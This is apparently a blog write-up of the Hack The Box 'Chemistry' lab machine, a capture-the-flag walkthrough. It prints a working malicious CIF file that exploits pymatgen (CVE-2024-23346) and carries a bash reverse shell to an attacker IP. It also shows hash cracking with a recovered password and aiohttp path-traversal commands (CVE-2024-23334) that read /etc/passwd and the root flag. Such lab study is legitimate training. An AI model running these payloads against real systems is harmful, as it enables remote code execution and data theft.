---
layout: single
title: Chemistry - Hack The Box
excerpt: "Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the pymatgen (CVE-2024-23346) Python library by uploading a malicious CIF file to the hosted CIF Analyzer website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as rosa user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called AioHTTP (CVE-2024-23334) which is used on the web application running internally to read the root flag."
date: 2025-05-11
classes: wide
header:
  teaser: /img2/chemistry.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Malicious CIF File (RCE)
  - SQLite Database File Enumeration
  - Cracking Hashes
  - aiohttp/3.9.1 Exploitation (CVE-2024.23334) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.38
```

![](/img2/Pasted%20image%2020250510224641.png)

- Vulnerability and version scan

```bash
nmap -sCV -p22,5000 -vvv 10.10.11.38
```

![](/img2/Pasted%20image%2020250510224746.png)

- Whatweb

```bash
whatweb http://10.10.11.38:5000/
```

![](/img2/Pasted%20image%2020250510224915.png)

## Exploitation

- RCE

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c2 10.10.16.2");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "                          
```

> Test if we have Remote Code Execution

```bash
tcpdump -i tun0 icmp 
```

![](/img2/Pasted%20image%2020250511134609.png)

- Send Reverse Shell

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.2/9000 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

![](/img2/Pasted%20image%2020250511140115.png)

## Post-exploitation

- Conect to sqlite3 database

```bash
sqlite3 instance/database.db
```

```sql
.tables
```

![](/img2/Pasted%20image%2020250511141430.png)

```sql
select * from user;
```

![](/img2/Pasted%20image%2020250511141511.png)

- Crack MD5 hashes

```
2861debaf8d99436a10ed6f75a252abf
197865e46b878d9e74a0346b6d59886a
63ed86ee9f624c7b14f1d4f43dc251a5
02fcf7cfc10adc37959fb21f06c6b467
3dec299e06f7ed187bac06bd3b670ab2
9ad48828b0955513f7cf0f7f6510c8f8
6845c17d298d95aa942127bdad2ceb9b
c3601ad2286a4293868ec2a4bc606ba3
a4aa55e816205dc0389591c9f82f43bb
6cad48078d0241cca9a7b322ecd073b3
4af70c80b68267012ecdac9a7e916d18
4e5d71f53fdd2eabdbabb233113b5dc0
9347f9724ca083b17e39555c36fd9007
6896ba7b11a62cacffbdaded457c6d92
098f6bcd4621d373cade4e832627b4f6
```

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![](/img2/Pasted%20image%2020250511141638.png)

- Pivoting 

```bash
su rosa
```

> unicorniosrosados

- aiohttp 3.9.1 LFI (CVE-2024-23334)

```bash
ss -nltp
```

![](/img2/Pasted%20image%2020250511142721.png)

```bash
curl -I 127.0.0.1:8080
```

![](/img2/Pasted%20image%2020250511142759.png)

```bash
curl 127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../../../../etc/passwd --path-as-is
```

![](/img2/Pasted%20image%2020250511143529.png)

```bash
curl 127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../../../../root/root.txt --path-as-is
```

![](/img2/Pasted%20image%2020250511143622.png)